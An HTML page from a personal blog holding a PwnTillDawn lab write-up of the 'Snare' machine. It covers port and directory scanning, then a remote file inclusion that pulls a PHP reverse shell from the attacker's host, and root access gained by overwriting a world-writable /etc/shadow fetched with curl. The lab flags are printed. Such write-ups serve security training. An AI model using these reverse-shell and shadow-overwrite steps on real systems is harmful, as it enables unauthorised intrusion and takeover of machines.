@@ -1,0 +1,1513 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="description" content="Kaulik Makwana - Cybersecurity Engineer & Penetration Tester">
+    <title>Snare Machine Writeup | Kaulik Makwana</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="/assets/images/favicon/favicon.png">
+    
+    <!-- TailwindCSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        'cyber-green': '#4ade80',
+                        'cyber-black': '#0a0a0a',
+                        'cyber-gray': '#1a1a1a',
+                    },
+                    animation: {
+                        'terminal-cursor': 'blink 1s step-end infinite',
+                    },
+                    keyframes: {
+                        blink: {
+                            '0%, 100%': { opacity: '1' },
+                            '50%': { opacity: '0' },
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <!-- JetBrains Mono Font -->
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- AOS CSS -->
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/assets/css/styles.css">
+    
+    <!-- Prism.js for syntax highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+    
+    <!-- Marked.js for Markdown rendering -->
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    
+    <!-- Custom styles -->
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+
+        :root {
+            --cyber-black: #111111;
+            --cyber-gray: #1a1a1a;
+            --cyber-green: #4ade80;
+            --animation-timing: cubic-bezier(0.16, 1, 0.3, 1);
+            --animation-quick: 0.2s;
+            --animation-normal: 0.3s;
+            --animation-slow: 0.5s;
+            --spring-timing: cubic-bezier(0.37, 0, 0.63, 1);
+        }
+
+        /* Core styles */
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background-color: var(--cyber-black);
+            color: #e5e7eb;
+            opacity: 0;
+            animation: fadeIn 0.4s var(--spring-timing) forwards;
+        }
+
+        /* Animation keyframes */
+        @keyframes fadeIn {
+            from { 
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.2); }
+            50% { box-shadow: 0 0 15px 5px rgba(74, 222, 128, 0.1); }
+            100% { box-shadow: 0 0 0 0 rgba(74, 222, 128, 0); }
+        }
+
+        @keyframes terminalCursor {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes gridPulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Enhanced button animations */
+        .nav-button {
+            position: relative;
+            overflow: hidden;
+            transition: all var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            background: rgba(74, 222, 128, 0.1);
+            transform: translate(-50%, -50%) scale(0);
+            border-radius: inherit;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-button:hover::before {
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        .nav-button:active {
+            transform: scale(0.98);
+        }
+
+        /* Enhanced glass effect */
+        .glass {
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            transition: all var(--animation-normal) var(--spring-timing);
+        }
+
+        .glass:hover {
+            border-color: rgba(74, 222, 128, 0.2);
+            box-shadow: 0 0 20px rgba(74, 222, 128, 0.1);
+        }
+
+        /* Navigation link animations */
+        .nav-link {
+            position: relative;
+            transition: color var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: var(--cyber-green);
+            transform: scaleX(0);
+            transform-origin: right;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        .nav-link:hover::after {
+            transform: scaleX(1);
+            transform-origin: left;
+        }
+
+        /* Terminal cursor animation */
+        .terminal-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 1em;
+            background: var(--cyber-green);
+            margin-left: 4px;
+            animation: blink 1s step-end infinite;
+            opacity: 0.7;
+            vertical-align: text-bottom;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0; }
+            50% { opacity: 0.7; }
+        }
+
+        /* Enhanced scroll indicator */
+        .scroll-indicator {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--cyber-green), transparent);
+            z-index: 1000;
+            transform-origin: left;
+            transition: transform var(--animation-quick) var(--spring-timing);
+        }
+
+        /* Mobile Optimizations */
+        @media (max-width: 768px) {
+            .container {
+                padding-left: 1rem;
+                padding-right: 1rem;
+            }
+
+            .mobile-nav {
+                display: none;
+                position: fixed;
+                top: 4rem;
+                left: 0;
+                right: 0;
+                background: rgba(26, 26, 26, 0.95);
+                backdrop-filter: blur(12px);
+                -webkit-backdrop-filter: blur(12px);
+                padding: 1rem;
+                z-index: 50;
+                border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            }
+
+            .mobile-nav.active {
+                display: block;
+                animation: slideDown 0.2s ease-out;
+            }
+
+            @keyframes slideDown {
+                from {
+                    transform: translateY(-10px);
+                    opacity: 0;
+                }
+                to {
+                    transform: translateY(0);
+                    opacity: 1;
+                }
+            }
+
+            .mobile-nav a {
+                display: block;
+                padding: 0.75rem 1rem;
+                color: #e5e7eb;
+                font-size: 1rem;
+                border-radius: 0.375rem;
+                transition: all 0.2s ease;
+                margin-bottom: 0.5rem;
+                border: 1px solid transparent;
+            }
+
+            .mobile-nav a:hover,
+            .mobile-nav a.active {
+                background: rgba(74, 222, 128, 0.1);
+                border-color: rgba(74, 222, 128, 0.2);
+                color: var(--cyber-green);
+            }
+
+            .menu-button {
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between;
+                width: 24px;
+                height: 20px;
+                padding: 0;
+                background: transparent;
+                border: none;
+                cursor: pointer;
+            }
+
+            .menu-button span {
+                display: block;
+                width: 100%;
+                height: 2px;
+                background: var(--cyber-green);
+                transition: all 0.2s ease;
+            }
+
+            .menu-button.active span:nth-child(1) {
+                transform: translateY(9px) rotate(45deg);
+            }
+
+            .menu-button.active span:nth-child(2) {
+                opacity: 0;
+            }
+
+            .menu-button.active span:nth-child(3) {
+                transform: translateY(-9px) rotate(-45deg);
+            }
+
+            /* Typography Adjustments */
+            h1 { font-size: 1.875rem !important; }
+            h2 { font-size: 1.5rem !important; }
+            h3 { font-size: 1.25rem !important; }
+
+            /* Content Spacing */
+            .content-wrapper {
+                padding-top: 1rem;
+            }
+
+            /* Navigation Adjustments */
+            .nav-link {
+                padding: 0.5rem;
+            }
+
+            /* Button Adjustments */
+            .btn {
+                padding: 0.5rem 1rem;
+                font-size: 0.875rem;
+            }
+        }
+
+        /* Preserve Desktop Styles */
+        @media (min-width: 769px) {
+            .menu-button {
+                display: none;
+            }
+
+            .mobile-nav {
+                display: none;
+            }
+        }
+
+        /* Safe Area Insets */
+        @supports(padding: max(0px)) {
+            .container {
+                padding-left: max(1rem, env(safe-area-inset-left));
+                padding-right: max(1rem, env(safe-area-inset-right));
+            }
+
+            .mobile-nav {
+                padding-bottom: max(1rem, env(safe-area-inset-bottom));
+            }
+        }
+
+        /* Markdown Content Styles */
+        .markdown-content ul {
+            list-style-type: none;
+            padding-left: 1.75rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ul > li {
+            position: relative;
+            margin: 0.5rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ul > li::before {
+            content: ">";
+            position: absolute;
+            left: -1.5rem;
+            color: var(--cyber-green);
+            opacity: 0.8;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ul > li > ul {
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ul > li > ul > li::before {
+            content: "-";
+        }
+
+        .markdown-content ol {
+            counter-reset: section;
+            list-style-type: none;
+            padding-left: 2.5rem;
+            margin: 1rem 0;
+        }
+
+        .markdown-content ol > li {
+            counter-increment: section;
+            position: relative;
+            margin: 0.75rem 0;
+            padding-left: 0.5rem;
+        }
+
+        .markdown-content ol > li::before {
+            content: counter(section) ".";
+            position: absolute;
+            left: -2.5rem;
+            width: 2rem;
+            text-align: right;
+            color: var(--cyber-green);
+            font-weight: 500;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .markdown-content ol > li > ol {
+            counter-reset: subsection;
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .markdown-content ol > li > ol > li {
+            counter-increment: subsection;
+            margin: 0.5rem 0;
+        }
+
+        .markdown-content ol > li > ol > li::before {
+            content: counter(section) "." counter(subsection);
+        }
+
+        /* Table Styles */
+        .markdown-content table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: rgba(26, 26, 26, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(74, 222, 128, 0.1);
+            border-radius: 0.5rem;
+            overflow-x: auto;
+            display: block;
+        }
+
+        .markdown-content th {
+            background: rgba(55, 65, 81, 0.5);
+            text-align: left;
+            padding: 0.75rem 1rem;
+            font-weight: 600;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            color: var(--cyber-green);
+            white-space: nowrap;
+        }
+
+        .markdown-content td {
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+            min-width: 100px;
+        }
+
+        .markdown-content tr:hover {
+            background: rgba(74, 222, 128, 0.05);
+            transition: background-color 0.2s;
+        }
+
+        @media (max-width: 768px) {
+            .markdown-content table {
+                margin: 1rem -1rem;
+                border-radius: 0;
+            }
+
+            .markdown-content th,
+            .markdown-content td {
+                padding: 0.5rem 0.75rem;
+            }
+
+            .markdown-content ul {
+                padding-left: 1.5rem;
+            }
+
+            .markdown-content ol {
+                padding-left: 2rem;
+            }
+
+            .markdown-content ul > li::before {
+                left: -1.25rem;
+            }
+
+            .markdown-content ol > li::before {
+                left: -2rem;
+                width: 1.75rem;
+            }
+        }
+    </style>
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Snare Machine Writeup | Kaulik Makwana</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Snare Machine Writeup" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview" />
+<meta property="og:description" content="Overview" />
+<link rel="canonical" href="https://kaulikmakwana.github.io/writeups/pwntilldawn/Snare-Machine/" />
+<meta property="og:url" content="https://kaulikmakwana.github.io/writeups/pwntilldawn/Snare-Machine/" />
+<meta property="og:site_name" content="Kaulik Makwana" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-05-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Snare Machine Writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-05-12T00:00:00+00:00","datePublished":"2025-05-12T00:00:00+00:00","description":"Overview","headline":"Snare Machine Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/pwntilldawn/Snare-Machine/"},"url":"https://kaulikmakwana.github.io/writeups/pwntilldawn/Snare-Machine/"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+<body class="min-h-screen flex flex-col bg-gradient-to-b from-cyber-black to-cyber-gray">
+    <!-- Scroll Progress Indicator -->
+    <div class="scroll-indicator"></div>
+
+    <!-- Navigation -->
+    <nav class="fixed w-full top-0 glass z-50">
+        <div class="max-w-6xl mx-auto px-4">
+            <div class="flex justify-between items-center h-16">
+                <a href="/" class="group flex items-center space-x-2">
+                    <span class="text-xl font-bold text-cyber-green">[KM]</span>
+                    <span class="hidden md:inline text-sm text-gray-400 group-hover:text-cyber-green transition-colors">~/offensive-security</span>
+                    <span class="terminal-cursor"></span>
+                </a>
+                
+                <!-- Desktop Navigation -->
+                <div class="hidden md:flex space-x-6">
+                    <a href="/" class="nav-link ">~/home</a>
+                    <a href="/about" class="nav-link ">~/about</a>
+                    <a href="/writeups" class="nav-link active text-cyber-green">~/writeups</a>
+                    <a href="/learnings" class="nav-link ">~/learnings</a>
+                </div>
+
+                <!-- Mobile Menu Button -->
+                <button class="md:hidden menu-button" id="menuButton" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation -->
+        <div class="mobile-nav md:hidden" id="mobileNav">
+            <a href="/" class="">~/home</a>
+            <a href="/about" class="">~/about</a>
+            <a href="/writeups" class="active">~/writeups</a>
+            <a href="/learnings" class="">~/learnings</a>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="flex-grow pt-16">
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" rel="stylesheet" />
+
+<!-- Main Container with Border (matches home page) -->
+<article class="min-h-screen relative py-6 md:py-12">
+    <div class="absolute inset-0 bg-[linear-gradient(rgba(26,26,26,0.5)_2px,transparent_2px),linear-gradient(90deg,rgba(26,26,26,0.5)_2px,transparent_2px)] bg-[size:50px_50px] [mask-image:radial-gradient(ellipse_80%_80%_at_50%_50%,black,transparent)]"></div>
+    <div class="max-w-7xl mx-auto px-2 sm:px-4 relative">
+        <div class="glass border border-cyber-green/10 rounded-2xl p-4 sm:p-8 flex flex-col min-h-[60vh] justify-center">
+            <!-- Back to Writeups Link -->
+            <div class="mb-3 sm:mb-4 md:mb-6 lg:mb-8 w-full" data-aos="fade-right" data-aos-delay="200">
+                <a href="/writeups" class="group inline-flex items-center justify-center bg-cyber-black/50 text-cyber-green px-3 py-2 sm:px-4 sm:py-2.5 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 text-xs sm:text-sm">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1.5 sm:mr-2 transform group-hover:-translate-x-1 transition-transform duration-300" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                    </svg>
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+            </div>
+
+            <header class="mb-4 sm:mb-6 md:mb-8 lg:mb-10 w-full">
+                <div class="terminal-text mb-2 sm:mb-3 text-cyber-green text-xs sm:text-sm font-mono opacity-60" data-aos="fade-up" data-aos-delay="400">
+                    <span class="opacity-50">$</span> cat snare-machine-writeup.md
+                </div>
+                <h1 class="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold bg-gradient-to-r from-cyber-green to-emerald-400 bg-clip-text text-transparent break-words" data-aos="fade-up" data-aos-delay="600">Snare Machine Writeup</h1>
+                <div class="text-gray-400 mt-1.5 sm:mt-2 font-mono text-xs sm:text-sm" data-aos="fade-up" data-aos-delay="800">
+                    
+                        <span class="text-cyber-green">></span> May 12, 2025
+                        
+                        <span class="text-cyber-green mx-2">|</span> <span class="text-cyber-green">PwnTillDawn</span>
+                        
+                    
+                </div>
+            </header>
+
+            <div class="markdown-content prose prose-invert max-w-none font-mono text-xs sm:text-sm w-full" data-aos="fade-up" data-aos-delay="1000">
+                <h1 id="section-overview">Overview</h1>
+
+<p><strong>Target IP</strong>: (10.150.150.18)</p>
+
+<h2 id="section-initial-enumeration">Initial Enumeration</h2>
+
+<h3 id="section-port-scanning">Port Scanning</h3>
+
+<p>Initial port discovery:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">--min-rate</span> 10000 <span class="nt">-p-</span> 10.150.150.18
+22/tcp open ssh
+80/tcp open http
+</code></pre></div></div>
+
+<p>Detailed service enumeration:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80 <span class="nt">-T4</span> <span class="nt">-v</span> <span class="nt">-oN</span> Nmap.md 10.150.150.18
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-title: Welcome to my homepage!
+|_Requested resource was /index.php?page<span class="o">=</span>home
+</code></pre></div></div>
+
+<h3 id="section-web-directory-enumeration">Web Directory Enumeration</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://10.150.150.18/ <span class="nt">-t</span> 25 <span class="nt">-o</span> dirsearch.md
+
+<span class="c"># Key findings:</span>
+<span class="o">[</span>00:04:42] 200 - 355B - /about.php
+<span class="o">[</span>00:05:10] 200 - 323B - /contact.php
+<span class="o">[</span>00:05:23] 200 - 326B - /home.php
+<span class="o">[</span>00:05:25] 301 - 317B - /includes -&gt; http://10.150.150.18/includes/
+<span class="o">[</span>00:05:51] 200 - 82B - /README.md
+</code></pre></div></div>
+
+<p>Checking README.md content:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://10.150.150.18/README.md
+<span class="c"># Result:</span>
+<span class="c"># basic-sample-php-template-example</span>
+Explanation <span class="k">for </span>organizing the file structure
+</code></pre></div></div>
+
+<h2 id="section-exploitation-phase">Exploitation Phase</h2>
+
+<h3 id="section-setting-up-for-rfi-exploitation">Setting Up for RFI Exploitation</h3>
+
+<ol>
+  <li>Preparing reverse shell:</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Copy PHP reverse shell template</span>
+<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php shell.php
+
+<span class="c"># Edit shell.php to add our IP and port</span>
+<span class="nv">$ </span>nano shell.php
+<span class="c"># Modified:</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.66.67.198'</span><span class="p">;</span>
+<span class="nv">$port</span> <span class="o">=</span> 1234<span class="p">;</span>
+
+<span class="c"># Exploit Endpoint </span>
+<span class="c"># -&gt; 'http://10.150.150.18/index.php?page=contact' </span>
+<span class="c"># Exploitation payload </span>
+<span class="c"># -&gt; curl 'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'</span>
+
+<span class="c"># start python http server </span>
+<span class="nv">$ </span>python <span class="nt">-m</span> http.server 80 
+
+<span class="c"># listing ncat listner </span>
+<span class="nv">$ </span>rlwrap ncat <span class="nt">-nvlp</span> 1234 
+
+<span class="c"># execute payload </span>
+<span class="nv">$ </span>curl <span class="s1">'http://10.150.150.18/index.php?page=http://10.66.67.198/shell'</span>
+</code></pre></div></div>
+
+<h2 id="section-initial-access-enumeration">Initial Access Enumeration</h2>
+
+<p>After getting shell:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check user context</span>
+<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span>
+<span class="c"># Output:</span>
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+www-data
+snare
+
+<span class="c"># Find first flag</span>
+<span class="nv">$ </span>find / <span class="nt">-name</span> FLAG1.txt 2&gt;/dev/null
+<span class="nv">$ </span><span class="nb">cat</span> /home/snare/FLAG1.txt
+<span class="c"># Output: e335462da856f39997bffdc04b8d89ce1104fcc5</span>
+</code></pre></div></div>
+
+<h2 id="section-privilege-escalation">Privilege Escalation</h2>
+
+<h3 id="section-enumeration-for-pe-vector">Enumeration for PE Vector</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Search for writable files</span>
+<span class="nv">$ </span>find / <span class="nt">-not</span> <span class="nt">-type</span> l <span class="nt">-perm</span> <span class="nt">-o</span>+w 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> proc <span class="nt">-v</span> sys
+<span class="c"># Found writable shadow file</span>
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/shadow
+<span class="c"># Output: -rwxrwxrwx 1 root shadow 1129 Nov 20 2020 /etc/shadow</span>
+</code></pre></div></div>
+
+<h3 id="section-exploiting-shadow-file">Exploiting Shadow File</h3>
+
+<ol>
+  <li>On attacking machine:</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Generate new password hash</span>
+<span class="nv">$ </span>mkpasswd <span class="nt">-m</span> sha-512 Password@123
+<span class="c"># Output hash: $6$/GabzAw5BMMvbQOI$8PUfneBnk0x3nQRo7k1GxUdzlN5QeN/qOgOyVBvhwAj4DONHYfJNBdevF2f9AHxcwOgw6nL11HnWBSbpESxd61</span>
+
+<span class="c"># Create modified shadow file</span>
+<span class="nv">$ </span>nano shadow
+<span class="c"># Replace root's hash with new hash</span>
+</code></pre></div></div>
+
+<ol>
+  <li>On target machine:</li>
+</ol>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Download and replace shadow file</span>
+<span class="nv">$ </span>curl http://10.66.67.198/shadow <span class="o">&gt;</span> /etc/shadow
+
+<span class="c"># Switch to root</span>
+<span class="nv">$ </span>su root
+Password: Password@123
+
+<span class="c"># Verify root access</span>
+<span class="nv">$ </span><span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname</span>
+<span class="c"># Output:</span>
+root
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+snare
+
+<span class="c"># Get final flag</span>
+<span class="nv">$ </span><span class="nb">cat</span> /root/FLAG2.txt
+<span class="c"># Output: 2b0286a69b276189afe50517304963e5fa5982d9</span>
+</code></pre></div></div>
+
+<h2 id="section-tools-used">Tools Used</h2>
+
+<ul>
+  <li>nmap: Port scanning and service enumeration</li>
+  <li>dirsearch: Web directory enumeration</li>
+  <li>curl: Web requests and file transfers</li>
+  <li>netcat: Reverse shell listener</li>
+  <li>Python: HTTP server for hosting files</li>
+  <li>mkpasswd: Password hash generation</li>
+</ul>
+
+<h2 id="section-vulnerabilities-exploited">Vulnerabilities Exploited</h2>
+
+<ol>
+  <li>Remote File Inclusion (RFI) in PHP application</li>
+  <li>Writable /etc/shadow file</li>
+</ol>
+
+<h2 id="section-flags">Flags</h2>
+
+<ol>
+  <li>User Flag: <code class="language-plaintext highlighter-rouge">e335462da856f39997bffdc04b8d89ce1104fcc5</code></li>
+  <li>Root Flag: <code class="language-plaintext highlighter-rouge">2b0286a69b276189afe50517304963e5fa5982d9</code></li>
+</ol>
+
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="mt-8 sm:mt-12 flex flex-col md:flex-row items-center justify-between gap-3 sm:gap-4" data-aos="fade-up" data-aos-duration="600">
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        
+                        
+                        
+
+                <!-- Previous Writeup -->
+                
+                    
+                    <a href="/writeups/pwntilldawn/MonsieurCandie-Server/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-right" data-aos-duration="400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 mr-2 transform transition-transform duration-200 ease-spring group-hover:-translate-x-1" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                        </svg>
+                        <span class="font-mono">Previous</span>
+                    </a>
+                
+
+                <!-- Back to Index -->
+                <a href="/writeups" class="nav-button group flex items-center justify-center bg-cyber-black/50 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-up" data-aos-duration="400">
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+
+                <!-- Next Writeup -->
+                
+                    
+                    <a href="/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-left" data-aos-duration="400">
+                        <span class="font-mono">Next</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 ml-2 transform transition-transform duration-200 ease-spring group-hover:translate-x-1" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
+                        </svg>
+                    </a>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+<style>
+/* Custom styles for tables */
+.markdown-content table {
+    width: 100%;
+    border-collapse: collapse;
+    background: rgba(26, 26, 26, 0.7);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    display: table;
+    overflow-x: auto;
+    max-width: 100%;
+}
+
+.markdown-content thead {
+    background: rgba(55, 65, 81, 0.5);
+}
+
+.markdown-content th {
+    background: transparent;
+    text-align: left;
+    padding: 0.75rem 1rem;
+    font-weight: 600;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    color: #4ade80;
+    white-space: nowrap;
+}
+
+.markdown-content td {
+    padding: 0.75rem 1rem;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    min-width: 100px;
+}
+
+.markdown-content tr:hover {
+    background: rgba(74, 222, 128, 0.05);
+    transition: background-color 0.2s;
+}
+
+.markdown-content tbody tr:last-child td {
+    border-bottom: none;
+}
+
+/* Table wrapper for horizontal scrolling on mobile */
+.markdown-content .table-wrapper {
+    overflow-x: auto;
+    margin: 1rem -1rem;
+    padding: 0 1rem;
+    -webkit-overflow-scrolling: touch;
+}
+
+@media (max-width: 768px) {
+    .markdown-content table {
+        font-size: 0.875rem;
+    }
+
+    .markdown-content th,
+    .markdown-content td {
+        padding: 0.625rem 0.875rem;
+    }
+}
+
+/* Custom styles for code blocks */
+.markdown-content pre[class*="language-"] {
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    background: rgba(17, 17, 17, 0.95) !important;
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    font-size: 0.875rem;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    padding: 1rem;
+}
+
+/* Hide line numbers on desktop */
+@media (min-width: 641px) {
+    .line-numbers-rows {
+        display: none !important;
+    }
+    
+    .line-numbers {
+        padding-left: 1rem !important;
+    }
+}
+
+/* Show line numbers only on mobile */
